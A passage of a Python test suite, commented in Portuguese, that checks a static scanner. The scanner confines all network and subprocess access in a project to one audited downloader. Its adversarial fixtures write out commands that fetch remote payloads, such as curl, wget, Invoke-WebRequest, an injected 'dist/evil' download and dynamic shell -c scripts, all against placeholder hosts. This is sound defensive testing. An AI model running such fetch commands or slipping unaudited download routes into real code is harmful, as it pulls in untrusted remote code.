                return "acesso reflexivo a subprocesso"
            return None
        if target == "os" and (attribute is None or attribute == "system"):
            return "acesso reflexivo a subprocesso"
        module = protected_module(target)
        if module is not None:
            return f"acesso reflexivo a {module}"
        return None

    def downloader_transport_violation(name: str) -> str | None:
        if path == DOWNLOADER_PATH:
            return None
        marker = next(
            (
                module
                for module in (
                    "x86qw_runtime.io.downloader",
                    "maintenance.tools.downloader",
                    "downloader",
                )
                if name == module or name.startswith(module + ".")
            ),
            None,
        )
        if marker is None or name == marker:
            return None
        suffix = name[len(marker) + 1:]
        export = suffix.partition(".")[0]
        if export.startswith("_") or export in FORBIDDEN_DOWNLOADER_TRANSPORT_EXPORTS:
            return f"uso privado do transporte downloader: {export}"
        module = protected_module(suffix)
        if module is not None:
            return f"módulo de rede reexportado pelo downloader: {module}"
        return None

    def qualified_wrapper_name(node: ast.Call) -> str | None:
        name = dotted_name(node.func)
        if name is None:
            return None
        if name.startswith("self."):
            suffix = name.partition(".")[2]
            classes = [
                scope.name
                for scope in reversed(scope_chain(node))
                if isinstance(scope, ast.ClassDef)
            ]
            return ".".join([*classes, suffix]) if classes else None
        if "." in name:
            return name
        helper = helper_definition(name, node)
        if helper is None:
            return None
        parent_path = lexical_scope_path(helper, parents)
        return helper.name if parent_path == "<module>" else f"{parent_path}.{helper.name}"

    def analyze_process_argv(
        node: ast.Call,
        argv: list[str | None] | None,
        process_api: str,
    ) -> None:
        if not argv:
            report(node, "argv de subprocesso não resolvido")
            return
        executable_value = argv[0]
        if executable_value is None:
            report(node, "executável de subprocesso não resolvido")
            return
        executable = executable_value.replace("\\", "/").rsplit("/", 1)[-1].casefold()
        normalized = executable.removesuffix(".exe")
        if executable in shell_executables or normalized in shell_executables:
            command_switches = {"-c", "/c", "-command"}
            for index, argument in enumerate(argv[:-1]):
                if argument is not None and argument.casefold() in command_switches:
                    if argv[index + 1] is None:
                        report(node, "comando de shell não resolvido")
                    break
        known = [argument for argument in argv if argument is not None]
        embedded = set().union(*(remote_process_mechanisms(item) for item in known))
        network_processes = {
            mechanism.removesuffix(".exe")
            for mechanism in embedded
            if mechanism in NETWORK_EXECUTABLES
        }
        if executable in NETWORK_EXECUTABLES:
            network_processes.add(normalized)
        for mechanism in network_processes:
            key = (
                mechanism,
                process_api,
                lexical_scope_path(node, parents),
                ast.unparse(node),
            )
            network_process_seen.setdefault(key, []).append(node)
            if key not in ALLOWED_NETWORK_PROCESS_CALLS.get(path, frozenset()):
                report(node, f"subprocesso remoto {mechanism}")
        for mechanism in embedded:
            if mechanism not in NETWORK_EXECUTABLES and not executable_is_allowed(node, mechanism):
                report(node, f"subprocesso remoto embutido via {mechanism}")
        if (
            any(re.search(r"https?://", item, flags=re.IGNORECASE) for item in known)
            and executable not in NETWORK_EXECUTABLES
        ):
            report(node, f"subprocesso remoto não inventariado: {executable or '<dinâmico>'}")

    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for imported in node.names:
                bound = imported.asname or imported.name.partition(".")[0]
                aliases[bound] = imported.name if imported.asname else bound
                module = protected_module(imported.name)
                if module is not None and not module_is_allowed(module):
                    report(node, f"import direto de {module}")
        elif isinstance(node, ast.ImportFrom):
            base = node.module or ""
            for imported in node.names:
                full_name = f"{base}.{imported.name}" if base else imported.name
                aliases[imported.asname or imported.name] = full_name
                transport_violation = downloader_transport_violation(full_name)
                if transport_violation is not None:
                    report(node, transport_violation)
                module = protected_module(full_name) or protected_module(base)
                if module is not None and not module_is_allowed(module):
                    report(node, f"import direto de {module}")
        elif isinstance(node, (ast.Assign, ast.AnnAssign, ast.NamedExpr)):
            value = node.value
            strings = known_strings(value, node)
            names = assigned_names(node)
            for name in names:
                allowed = ALLOWED_EMBEDDED_NETWORK_COMMANDS.get(path, {}).get(
                    name, frozenset()
                )
                for string in strings:
                    for mechanism in remote_string_mechanisms(string):
                        if mechanism not in allowed:
                            report(node, f"comando remoto embutido via {mechanism}")

    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            if (
                path in ALLOWED_OPENER_OPEN_CALLS
                and isinstance(node.func, ast.Attribute)
                and node.func.attr == "open"
            ):
                opener_key = (
                    lexical_scope_path(node, parents),
                    ast.unparse(node),
                )
                opener_open_seen.setdefault(opener_key, []).append(node)
                if opener_key not in ALLOWED_OPENER_OPEN_CALLS[path]:
                    report(node, "chamada opener.open não inventariada")
            reflection = reflective_boundary(node)
            if reflection is not None:
                report(node, reflection)
            call_name = resolved_dotted_name(node.func)
            if call_name in {"__import__", "importlib.import_module"} and node.args:
                imported = resolve_string(node.args[0], node)
                imported_modules = [imported] if imported is not None else []
                if not imported_modules:
                    report(node, "import dinâmico não resolvido")
                for value in imported_modules:
                    module = protected_module(value)
                    if module is not None and not module_is_allowed(module):
                        report(node, f"import dinâmico de {module}")
            if node.args and call_name in process_calls:
                first_argument = node.args[0]
                if any(
                    keyword.arg == "shell"
                    and isinstance(keyword.value, ast.Constant)
                    and keyword.value.value is True
                    for keyword in node.keywords
                ):
                    report(node, "subprocesso com shell=True")
                if not dynamic_process_is_allowed(node, call_name, first_argument):
                    if call_name == "os.system":
                        script = resolve_string(first_argument, node)
                        analyze_process_argv(node, ["sh", "-c", script], call_name)
                    else:
                        analyze_process_argv(
                            node, resolve_argv(first_argument, node), call_name,
                        )

            wrapper_name = qualified_wrapper_name(node)
            wrapper = PROCESS_WRAPPER_MODELS.get(path, {}).get(wrapper_name or "")
            if wrapper is not None:
                kind, prefix = wrapper
                if kind == "argv":
                    argv = resolve_argv(node.args[0], node) if node.args else None
                else:
                    argv = [*prefix]
                    argv.extend(resolve_string(argument, node) for argument in node.args)
                analyze_process_argv(node, argv, wrapper_name or "<wrapper>")
        elif isinstance(node, (ast.Attribute, ast.Name)):
            parent = parents.get(node)
            if (
                path in ALLOWED_OPENER_OPEN_CALLS
                and isinstance(node, ast.Attribute)
                and node.attr == "open"
                and not (isinstance(parent, ast.Call) and parent.func is node)
            ):
                report(node, "método opener.open escapou da chamada direta inventariada")
            if isinstance(node, ast.Name) and isinstance(parent, ast.Attribute) and parent.value is node:
                continue
            if isinstance(node, ast.Attribute) and isinstance(parent, ast.Attribute) and parent.value is node:
                continue
            name = dotted_name(node)
            if name is None:
                continue
            prefix, separator, suffix = name.partition(".")
            if prefix not in aliases:
                continue
            name = aliases[prefix] + (separator + suffix if separator else "")
            transport_violation = downloader_transport_violation(name)
            if transport_violation is not None:
                report(node, transport_violation)
            module = protected_module(name)
            if module is not None:
                if name in FORBIDDEN_HIGH_LEVEL_NETWORK_APIS:
                    report(node, f"API de rede de alto nível proibida: {name}")
                elif not usage_is_allowed(node, module, name):
                    report(node, f"uso direto de {module} fora do adaptador")
    for expected in ALLOWED_NETWORK_PROCESS_CALLS.get(path, frozenset()):
        matches = network_process_seen.get(expected, [])
        if len(matches) != 1:
            report(
                matches[0] if matches else tree,
                "allowlist de subprocesso remoto não corresponde a um único call site: "
                + expected[0],
            )
    for expected, expected_count in ALLOWED_NETWORK_MODULE_USAGES.get(path, {}).items():
        matches = network_module_seen.get(expected, [])
        if len(matches) != expected_count:
            report(
                matches[0] if matches else tree,
                "allowlist de API de rede divergiu do número exato de call sites: "
                + expected[2],
            )
    for expected, expected_count in ALLOWED_OPENER_OPEN_CALLS.get(path, {}).items():
        matches = opener_open_seen.get(expected, [])
        if len(matches) != expected_count:
            report(
                matches[0] if matches else tree,
                "allowlist de opener.open divergiu do número exato de call sites",
            )
    return sorted(violations, key=lambda item: (os.fspath(item.path), item.line, item.mechanism))


def scan_script_remote_boundary(
    path: Path,
    source: str | None = None,
) -> list[RemoteBoundaryViolation]:
    allowances = {
        mechanism: list(patterns)
        for mechanism, patterns in ALLOWED_BOOTSTRAP_SCRIPT_LINES.get(path, {}).items()
    }
    violations: set[RemoteBoundaryViolation] = set()
    if source is None:
        source = path.read_text(encoding="utf-8")
    for line_number, line in enumerate(source.splitlines(), 1):
        for mechanism in remote_process_mechanisms(line):
            candidates = allowances.get(mechanism, [])
            matched = next(
                (index for index, pattern in enumerate(candidates) if re.fullmatch(pattern, line)),
                None,
            )
            if matched is None:
                violations.add(RemoteBoundaryViolation(
                    path, line_number, f"rota remota de script via {mechanism}",
                ))
            else:
                candidates.pop(matched)
    if path in POWERSHELL_BOOTSTRAP_PATHS:
        marker = "$DownloaderSource = @'\n"
        marker_count = source.count(marker)
        if marker_count != 1:
            violations.add(RemoteBoundaryViolation(
                path, 1, "bloco Python DownloaderSource ausente ou ambíguo",
            ))
        else:
            body_start = source.index(marker) + len(marker)
            body_end = source.find("\n'@", body_start)
            if body_end < 0:
                violations.add(RemoteBoundaryViolation(
                    path, 1, "bloco Python DownloaderSource sem terminador",
                ))
            else:
                embedded_source = source[body_start:body_end]
                line_offset = source[:body_start].count("\n")
                try:
                    embedded_violations = scan_python_remote_boundary(
                        path, embedded_source,
                    )
                except SyntaxError as error:
                    violations.add(RemoteBoundaryViolation(
                        path,
                        line_offset + (error.lineno or 1),
                        "bloco Python DownloaderSource inválido",
                    ))
                else:
                    violations.update(
                        RemoteBoundaryViolation(
                            path,
                            line_offset + violation.line,
                            "Python embutido: " + violation.mechanism,
                        )
                        for violation in embedded_violations
                    )
    return sorted(violations, key=lambda item: (item.line, item.mechanism))


def scan_remote_boundary(roots: Iterable[Path]) -> list[RemoteBoundaryViolation]:
    violations: list[RemoteBoundaryViolation] = []
    for path in remote_consumer_files(roots):
        if is_python_consumer(path):
            violations.extend(scan_python_remote_boundary(path))
        else:
            violations.extend(scan_script_remote_boundary(path))
    return sorted(violations, key=lambda item: (os.fspath(item.path), item.line, item.mechanism))


class FakeResponse:
    def __init__(
        self,
        body: bytes = b"",
        *,
        headers: dict[str, str] | None = None,
        url: str = "https://downloads.example.invalid/artifact.zip",
    ) -> None:
        self._body = body
        self._offset = 0
        self.headers = headers or {}
        self._url = url

    def __enter__(self) -> "FakeResponse":
        return self

    def __exit__(self, *_args: object) -> None:
        return None

    def geturl(self) -> str:
        return self._url

    def read(self, size: int) -> bytes:
        if self._offset >= len(self._body):
            return b""
        block = self._body[self._offset : self._offset + size]
        self._offset += len(block)
        return block


class EndlessResponse(FakeResponse):
    def __init__(self) -> None:
        super().__init__()
        self.read_calls = 0

    def read(self, size: int) -> bytes:
        self.read_calls += 1
        return b"x" * size


class RecordingEndlessResponse(EndlessResponse):
    def __init__(self) -> None:
        super().__init__()
        self.requested_sizes: list[int] = []

    def read(self, size: int) -> bytes:
        self.requested_sizes.append(size)
        return super().read(size)


class ReadOneResponse(FakeResponse):
    def __init__(self, body: bytes, clock: "AdvancingClock") -> None:
        super().__init__(body)
        self.clock = clock
        self.read_calls = 0
        self.read1_calls = 0

    def read(self, _size: int) -> bytes:
        self.read_calls += 1
        raise AssertionError("read() não deve agregar várias leituras de socket")

    def read1(self, size: int) -> bytes:
        self.read1_calls += 1
        self.clock.advance(0.6)
        return super().read(min(size, 1))


class AdvancingClock:
    def __init__(self) -> None:
        self.value = 0.0

    def __call__(self) -> float:
        return self.value

    def advance(self, seconds: float) -> None:
        self.value += seconds


class OutputProxy:
    def __init__(
        self,
        handle: object,
        *,
        write_error: OSError | None = None,
        flush_error: OSError | None = None,
        short_write: bool = False,
        close_error: OSError | None = None,
    ) -> None:
        self._handle = handle
        self._write_error = write_error
        self._flush_error = flush_error
        self._short_write = short_write
        self._close_error = close_error

    @property
    def closed(self) -> bool:
        return bool(getattr(self._handle, "closed"))

    def write(self, data: bytes) -> int:
        if self._write_error is not None:
            raise self._write_error
        written = int(getattr(self._handle, "write")(data))
        return written - 1 if self._short_write and written else written

    def flush(self) -> None:
        if self._flush_error is not None:
            raise self._flush_error
        getattr(self._handle, "flush")()

    def fileno(self) -> int:
        return int(getattr(self._handle, "fileno")())

    def close(self) -> None:
        if self._close_error is not None:
            error = self._close_error
            self._close_error = None
            getattr(self._handle, "close")()
            raise error
        getattr(self._handle, "close")()


class BlockingResolverProcess:
    def __init__(self, *, reap_delay: float = 0.0) -> None:
        self.args = ["python", "resolver"]
        self.returncode: int | None = None
        self.reap_delay = reap_delay
        self.inputs: list[bytes | None] = []
        self.started = threading.Event()
        self.dns_started = threading.Event()
        self.dns_active = threading.Event()
        self.killed = threading.Event()
        self.collected = threading.Event()

    def communicate(self, input: bytes | None = None, timeout: float | None = None):
        self.inputs.append(input)
        if input == b"G":
            self.dns_started.set()
            self.dns_active.set()
        self.started.set()
        if not self.killed.wait(timeout):
            raise subprocess.TimeoutExpired(self.args, timeout)
        if self.reap_delay:
            time.sleep(self.reap_delay)
        self.returncode = -9
        self.collected.set()
        return b"", b""

    def kill(self) -> None:
        self.killed.set()
        self.dns_active.clear()


RESOLVER_CLEANUP_WAIT_SECONDS = 5


class DownloaderTests(unittest.TestCase):
    PAYLOAD = b"x86QW bounded downloader\n"
    URL = "https://downloads.example.invalid/artifact.zip"

    def test_no_consumer_bypasses_the_shared_remote_byte_boundary(self) -> None:
        roots = (
            ROOT / "x86qw_runtime",
            ROOT / "maintenance/manage.py",
            ROOT / "maintenance/tools",
            ROOT / "dist/installer/bin",
            ROOT / "site/public/install.sh",
            ROOT / "site/public/install.ps1",
        )
        consumers = remote_consumer_files(roots)
        self.assertIn(DOWNLOADER_PATH, consumers)
        self.assertIn(ROOT / "maintenance/tools/public_upstreams.py", consumers)
        self.assertIn(ROOT / "maintenance/tools/publish_gitlab_packages.py", consumers)
        self.assertIn(ROOT / "dist/installer/bin/install.ps1", consumers)
        violations = scan_remote_boundary(roots)
        self.assertEqual([], [violation.render() for violation in violations])
        self.assertTrue(ALLOWED_NETWORK_MODULE_USAGES[DOWNLOADER_PATH])
        self.assertNotIn("_testing_open_url", DOWNLOADER_PATH.read_text(encoding="utf-8"))
        testing_seam_consumers = [
            path.relative_to(ROOT)
            for path in consumers
            if "_testing_open_url" in path.read_text(encoding="utf-8")
        ]
        self.assertEqual([], testing_seam_consumers)

    def test_dynamic_process_suppressions_match_one_audited_callsite(self) -> None:
        for path, allowed in ALLOWED_DYNAMIC_PROCESS_CALLS.items():
            tree = ast.parse(path.read_text(encoding="utf-8"), filename=os.fspath(path))
            parents = {
                child: parent
                for parent in ast.walk(tree)
                for child in ast.iter_child_nodes(parent)
            }
            callsites = [
                (
                    dotted_name(node.func),
                    lexical_scope_path(node, parents),
                    ast.unparse(node.args[0]),
                )
                for node in ast.walk(tree)
                if isinstance(node, ast.Call)
                and node.args
                and dotted_name(node.func) in {
                    "os.system", "subprocess.Popen", "subprocess.call",
                    "subprocess.check_call", "subprocess.check_output", "subprocess.run",
                }
            ]
            for suppression in allowed:
                with self.subTest(path=path.relative_to(ROOT), suppression=suppression):
                    self.assertEqual(1, callsites.count(suppression))

            unresolved = [
                violation.render()
                for violation in scan_python_remote_boundary(path)
                if violation.mechanism == "argv de subprocesso não resolvido"
            ]
            self.assertEqual([], unresolved, path.relative_to(ROOT))

    def test_allowlisted_wrapper_callers_remain_inside_the_gate(self) -> None:
        source = (ROOT / "maintenance/manage.py").read_text(encoding="utf-8")
        source += (
            "\n\ndef adversarial_wrapper_caller(tool, script):\n"
            "    run([tool, 'status'])\n"
            "    run(['sh', '-c', script])\n"
        )
        violations = [
            violation
            for violation in scan_python_remote_boundary(
                ROOT / "maintenance/manage.py", source,
            )
            if violation.line > len(source.splitlines()) - 4
        ]
        self.assertEqual(
            {
                "comando de shell não resolvido",
                "executável de subprocesso não resolvido",
            },
            {violation.mechanism for violation in violations},
        )

    def test_remote_boundary_gate_recurses_and_rejects_alternate_ingress(self) -> None:
        fixtures = {
            "urllib.py": "import urllib.request\nurllib.request.urlopen('https://invalid')\n",
            "urllib3.py": "import urllib3\nurllib3.request('GET', 'https://invalid')\n",
            "requests.py": "import requests\nrequests.get('https://invalid')\n",
            "socket.py": "import socket\nsocket.create_connection(('invalid', 443))\n",
            "ssl.py": "import ssl\nssl.create_default_context()\n",
            "wget.py": "import subprocess\nsubprocess.run(['wget', 'https://invalid'])\n",
            "curl.py": "import subprocess\nsubprocess.run(['curl', 'https://invalid'])\n",
            "git.py": "import subprocess\nsubprocess.run(['git', 'clone', 'https://invalid'])\n",
            "gh.py": "import subprocess\nsubprocess.run(['gh', 'api', 'https://invalid'])\n",
            "powershell.py": (
                "import subprocess\nsubprocess.run(['powershell.exe', '-Command', "
                "'Invoke-WebRequest https://invalid'])\n"
            ),
            "dynamic.py": "import importlib\nimportlib.import_module('urllib.request')\n",
            "dynamic-composed.py": (
                "import importlib\n"
                "importlib.import_module('urllib' + '.request').urlopen('https://invalid')\n"
            ),
            "dynamic-join.py": (
                "import importlib\n"
                "module = ''.join(['urllib', '.request'])\n"
                "importlib.import_module(module).urlopen('https://invalid')\n"
            ),
            "dynamic-unresolved.py": (
                "import importlib\n"
                "module = input()\n"
                "importlib.import_module(module)\n"
            ),
            "helper-direct.py": (
                "import subprocess\n"
                "def remote_command():\n"
                "    return ['curl', 'https://invalid']\n"
                "subprocess.run(remote_command())\n"
            ),
            "helper-assigned.py": (
                "import subprocess\n"
                "def remote_command():\n"
                "    return ['curl', 'https://invalid']\n"
                "arguments = remote_command()\n"
                "subprocess.run(arguments)\n"
            ),
            "helper-parameter.py": (
                "import subprocess\n"
                "def remote_command(url):\n"
                "    return ['curl', url]\n"
                "subprocess.run(remote_command('https://invalid'))\n"
            ),
            "argv-unresolved.py": (
                "import subprocess\n"
                "subprocess.run(build_command())\n"
            ),
            "scope-shadowed-argv.py": (
                "import subprocess\n"
                "def run(command):\n"
                "    subprocess.run(command)\n"
                "command = ['echo']\n"
            ),
            "late-bound-argv.py": (
                "import subprocess\n"
                "subprocess.run(command)\n"
                "command = ['echo']\n"
            ),
            "helper-shadowed.py": (
                "import subprocess\n"
                "def command():\n"
                "    return ['echo']\n"
                "def run(command):\n"
                "    subprocess.run(command())\n"
            ),
            "dynamic-executable.py": (
                "import subprocess\n"
                "tool = input()\n"
                "subprocess.run([tool, 'status'])\n"
            ),
            "constant-shadowed.py": (
                "import subprocess\n"
                "tool = 'echo'\n"
                "def run(tool):\n"
                "    subprocess.run([tool, 'status'])\n"
            ),
            "dynamic-shell.py": (
                "import subprocess\n"
                "script = input()\n"
                "subprocess.run(['sh', '-c', script])\n"
            ),
            "reflective-subprocess.py": (
                "import subprocess\n"
                "getattr(subprocess, 'run')(['curl', 'https://invalid'])\n"
            ),
            "private-downloader-import.py": (
                "from maintenance.tools.downloader import _build_https_opener as opener\n"
                "opener().open('https://invalid', timeout=60).read()\n"
            ),
            "private-downloader-module.py": (
                "import maintenance.tools.downloader as downloader\n"
                "downloader._select_transport().open('https://invalid', timeout=60).read()\n"
            ),
            "downloader-network-reexport.py": (
                "import maintenance.tools.downloader as downloader\n"
                "downloader.urllib.request.urlopen('https://invalid').read()\n"
            ),
            "downloader-network-from-import.py": (
                "from maintenance.tools import downloader\n"
                "downloader.urllib.request.urlopen('https://invalid').read()\n"
            ),
            "late-bound-helper.py": (
                "import subprocess\n"
                "subprocess.run(command())\n"
                "def command():\n"
                "    return ['echo']\n"
            ),
            "network.pyw": "import urllib.request\nurllib.request.urlopen('https://invalid')\n",
            "extensionless": (
                "#!/usr/bin/env python3\n"
                "import urllib.request\nurllib.request.urlopen('https://invalid')\n"
            ),
            "shell-extensionless": "#!/usr/bin/env bash\ncurl https://invalid/payload\n",
            "remote-tool.py": (
                "import subprocess\nsubprocess.run(['custom-fetch', 'https://invalid/payload'])\n"
            ),
            "shell.py": (
                "import subprocess\nsubprocess.run(['sh', '-c', 'curl https://invalid'])\n"
            ),
            "network.ps1": "Invoke-RestMethod https://invalid/payload\n",
            "network.cmd": "powershell.exe -Command Invoke-WebRequest https://invalid\n",
            "network.bat": "@curl https://invalid/payload\n",
            "network.bash": "curl https://invalid/payload\n",
            "network.fish": "curl https://invalid/payload\n",
            "network.psm1": "Invoke-WebRequest https://invalid/payload\n",
        }
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary) / "consumer/nested/deeper"
            root.mkdir(parents=True)
            for name, source in fixtures.items():
                (root / name).write_text(source, encoding="utf-8")
            consumers = remote_consumer_files([Path(temporary)])
            self.assertEqual(len(fixtures), len(consumers))
            self.assertTrue(all("nested" in path.parts for path in consumers))
            violations = scan_remote_boundary([Path(temporary)])
            violated_paths = {violation.path.name for violation in violations}
        rendered = "\n".join(violation.render() for violation in violations)
        for expected in fixtures:
            with self.subTest(fixture=expected):
                self.assertIn(expected, violated_paths)
        scope_shadowed = [
            violation.mechanism
            for violation in violations
            if violation.path.name == "scope-shadowed-argv.py"
        ]
        self.assertEqual(["argv de subprocesso não resolvido"], scope_shadowed)
        expected_mechanisms = {
            "late-bound-argv.py": "argv de subprocesso não resolvido",
            "helper-shadowed.py": "argv de subprocesso não resolvido",
            "dynamic-executable.py": "executável de subprocesso não resolvido",
            "constant-shadowed.py": "executável de subprocesso não resolvido",
            "dynamic-shell.py": "comando de shell não resolvido",
            "reflective-subprocess.py": "acesso reflexivo a subprocesso",
            "private-downloader-import.py": "uso privado do transporte downloader",
            "private-downloader-module.py": "uso privado do transporte downloader",
            "downloader-network-reexport.py": "módulo de rede reexportado pelo downloader",
            "downloader-network-from-import.py": "módulo de rede reexportado pelo downloader",
            "late-bound-helper.py": "argv de subprocesso não resolvido",
        }
        for fixture, mechanism in expected_mechanisms.items():
            with self.subTest(fixture=fixture):
                actual = {
                    violation.mechanism
                    for violation in violations
                    if violation.path.name == fixture
                }
                self.assertTrue(any(
                    value.startswith(mechanism) for value in actual
                ), actual)
        for expected in (
            "urllib.request", "urllib3", "requests", "socket", "ssl", "wget", "curl",
            "git", "gh", "powershell", "import dinâmico", "não inventariado",
            "powershell-http", "argv de subprocesso não resolvido",
        ):
            with self.subTest(expected=expected):
                self.assertIn(expected, rendered)

    def test_boundary_allowlists_reject_new_routes_inside_approved_files(self) -> None:
        downloader_source = DOWNLOADER_PATH.read_text(encoding="utf-8")
        downloader_source += (
            "\n\ndef unapproved_route():\n"
            "    return urllib.request.urlopen('https://invalid/function')\n"
            "\nclass Shadow:\n"
            "    def _attempt(self):\n"
            "        return urllib.request.urlopen('https://invalid/class')\n"
            "\ndef wrapper():\n"
            "    def _attempt():\n"
            "        return urllib.request.urlopen('https://invalid/nested')\n"
            "    return _attempt()\n"
            "\ndef reflective_route():\n"
            "    return getattr(urllib.request, 'urlopen')('https://invalid/reflective')\n"
        )
        violations = scan_python_remote_boundary(DOWNLOADER_PATH, downloader_source)
        violation_lines = {
            violation.line
            for violation in violations
            if "urllib.request" in violation.mechanism
        }
        for marker in ("/function", "/class", "/nested", "/reflective"):
            with self.subTest(scope_collision=marker):
                expected_line = next(
                    index
                    for index, line in enumerate(downloader_source.splitlines(), 1)
                    if marker in line
                )
                self.assertIn(expected_line, violation_lines)

        bootstrap = ROOT / "dist/installer/bin/install.sh"
        bootstrap_source = bootstrap.read_text(encoding="utf-8")
        bootstrap_source += "\ncurl --fail https://invalid/payload\n"
        violations = scan_script_remote_boundary(bootstrap, bootstrap_source)
        self.assertTrue(any(
            violation.line == len(bootstrap_source.splitlines())
            and "curl" in violation.mechanism
            for violation in violations
        ))

        powershell = ROOT / "dist/installer/bin/install.ps1"
        powershell_source = powershell.read_text(encoding="utf-8")
        downloader_marker = "$DownloaderSource = @'\n"
        terminator = "\n'@\n"
        injected = "\nurllib.request.urlopen('https://invalid/bypass')" + terminator
        self.assertEqual(1, powershell_source.count(downloader_marker))
        downloader_start = powershell_source.index(downloader_marker) + len(downloader_marker)
        downloader_end = powershell_source.index(terminator, downloader_start)
        powershell_source = (
            powershell_source[:downloader_end]
            + injected
            + powershell_source[downloader_end + len(terminator):]
        )
        violations = scan_script_remote_boundary(powershell, powershell_source)
        self.assertTrue(any(
            "Python embutido" in violation.mechanism
            and "urllib.request" in violation.mechanism
            for violation in violations
        ))

    def test_exact_network_capabilities_reject_calls_added_to_approved_scopes(self) -> None:
        downloader_source = DOWNLOADER_PATH.read_text(encoding="utf-8")
        request_line = "    request = urllib.request.Request("
        self.assertEqual(1, downloader_source.count(request_line))
        injected_urlopen = downloader_source.replace(
            request_line,
            "    urllib.request.urlopen('https://invalid/in-attempt').read()\n"
            + request_line,
        )
        mechanisms = {
            violation.mechanism
            for violation in scan_python_remote_boundary(DOWNLOADER_PATH, injected_urlopen)
        }
        self.assertTrue(any(
            mechanism.startswith("API de rede de alto nível proibida: urllib.request.urlopen")
            for mechanism in mechanisms
        ))

        opener_line = "    opener = urllib.request.build_opener("
        self.assertEqual(1, downloader_source.count(opener_line))
        injected_opener = downloader_source.replace(
            opener_line,
            "    urllib.request.build_opener().open("
            "'https://invalid/in-opener').read()\n" + opener_line,
        )
        mechanisms = {
            violation.mechanism
            for violation in scan_python_remote_boundary(DOWNLOADER_PATH, injected_opener)
        }
        self.assertIn(
            "allowlist de API de rede divergiu do número exato de call sites: "
            "urllib.request.build_opener",
            mechanisms,
        )

        opener_registry = (
            "    setattr(opener, \"_x86qw_connection_registry\", registry)\n"
        )
        self.assertEqual(1, downloader_source.count(opener_registry))
        escaped_open = downloader_source.replace(
            opener_registry,
            opener_registry
            + "    fetch = opener.open\n"
            + "    fetch('https://invalid/escaped-open', timeout=60).read()\n",
        )
        mechanisms = {
            violation.mechanism
            for violation in scan_python_remote_boundary(DOWNLOADER_PATH, escaped_open)
        }
        self.assertIn(
            "método opener.open escapou da chamada direta inventariada",
            mechanisms,
        )

        for powershell in POWERSHELL_BOOTSTRAP_PATHS:
            source = powershell.read_text(encoding="utf-8")
            embedded_request = "        request = urllib.request.Request("
            self.assertEqual(1, source.count(embedded_request), powershell)
            injected = source.replace(
                embedded_request,
                "        urllib.request.build_opener().open("
                "'https://invalid/in-bootstrap').read()\n" + embedded_request,
            )
            mechanisms = {
                violation.mechanism
                for violation in scan_script_remote_boundary(powershell, injected)
            }
            self.assertTrue(any(
                mechanism.startswith(
                    "Python embutido: uso direto de urllib.request fora do adaptador"
                )
                for mechanism in mechanisms
            ), powershell)

            registry_line = "    opener.registry = registry\n"
            self.assertEqual(1, source.count(registry_line), powershell)
            escaped = source.replace(
                registry_line,
                registry_line
                + "    fetch = opener.open\n"
                + "    fetch('https://invalid/escaped-bootstrap-open', timeout=60).read()\n",
            )
            mechanisms = {
                violation.mechanism
                for violation in scan_script_remote_boundary(powershell, escaped)
            }
            self.assertIn(
                "Python embutido: método opener.open escapou da chamada direta inventariada",
                mechanisms,
            )

        publisher = ROOT / "maintenance/tools/publish_gitlab_packages.py"
        publisher_source = publisher.read_text(encoding="utf-8")
        curl_line = "    result = subprocess.run(["
        self.assertEqual(1, publisher_source.count(curl_line))
        injected_curl = publisher_source.replace(
            curl_line,
            "    subprocess.run(['curl', '--output', 'dist/evil', "
            "'https://invalid/evil'])\n" + curl_line,
        )
        mechanisms = {
            violation.mechanism
            for violation in scan_python_remote_boundary(publisher, injected_curl)
        }
        self.assertIn("subprocesso remoto curl", mechanisms)

    def test_network_process_allowlist_is_bijective_with_live_callsites(self) -> None:
        publisher = ROOT / "maintenance/tools/publish_gitlab_packages.py"
        source = publisher.read_text(encoding="utf-8")
        tree = ast.parse(source, filename=os.fspath(publisher))
        parents = {
            child: parent
            for parent in ast.walk(tree)
            for child in ast.iter_child_nodes(parent)
        }
        calls = [
            node
            for node in ast.walk(tree)
            if isinstance(node, ast.Call)
            and dotted_name(node.func) == "subprocess.run"
            and lexical_scope_path(node, parents) == "upload"
        ]
        self.assertEqual(1, len(calls))
        duplicate = "    " + ast.unparse(calls[0]) + "\n"
        marker = "    result = subprocess.run(["
        self.assertEqual(1, source.count(marker))
        duplicated_source = source.replace(marker, duplicate + marker)
        mechanisms = {
            violation.mechanism
            for violation in scan_python_remote_boundary(publisher, duplicated_source)
        }
        self.assertIn(
            "allowlist de subprocesso remoto não corresponde a um único call site: curl",
            mechanisms,
        )

    def pinned(
        self,
        destination: Path,
        *,
        url: str | None = None,
        payload: bytes | None = None,
        expected_size: int | None = None,
        expected_sha256: str | None = None,
        maximum_size: int | None = None,
        deadline_seconds: float = 10,
        attempts: int = 1,
        initial_backoff: float = 0,
        maximum_backoff: float = 10,
    ) -> downloader.PinnedArtifact:
        body = self.PAYLOAD if payload is None else payload
        return downloader.PinnedArtifact(
            url=self.URL if url is None else url,
            destination=destination,
            expected_size=len(body) if expected_size is None else expected_size,
            expected_sha256=(
                hashlib.sha256(body).hexdigest()
                if expected_sha256 is None
                else expected_sha256
            ),
            maximum_size=(
                max(1, len(body)) if maximum_size is None else maximum_size
            ),
            deadline_seconds=deadline_seconds,
            retry=downloader.RetryPolicy(
                attempts=attempts,
                initial_backoff=initial_backoff,
                maximum_backoff=maximum_backoff,
                jitter=0,
            ),
            label="fixture",
        )

    @staticmethod
    def mirror_url(index: int) -> str:
        return f"https://mirror-{index}.example.invalid/artifact.zip"

    def test_safe_url_for_log_redacts_credentials_query_and_fragment(self) -> None:
        sentinel = "X86QW_URL_SECRET_SENTINEL"
        rendered = downloader.safe_url_for_log(
            f"https://operator:{sentinel}@example.invalid:8443/{sentinel}.zip"
            f"?token={sentinel}#{sentinel}"
        )

        self.assertEqual("https://example.invalid:8443/<redigido>", rendered)
        self.assertNotIn(sentinel, rendered)
        self.assertNotIn("operator", rendered)

    def test_safe_url_for_log_replaces_a_control_injected_url(self) -> None:
        sentinel = "X86QW_URL_SECRET_SENTINEL"
        rendered = downloader.safe_url_for_log(
            f"https://example.invalid/file.zip?token={sentinel}\n[ERRO] forged"
        )

        self.assertEqual("<URL HTTPS inválida>", rendered)
        self.assertNotIn(sentinel, rendered)
        self.assertNotIn("\n", rendered)

    @staticmethod
    def response_opener(response: FakeResponse):
        def open_url(_request: object, _timeout: float) -> FakeResponse:
            return response

        return open_url

    def download(
        self,
        contract: downloader.DownloadContract,
        *,
        testing_open_url=None,
        **kwargs,
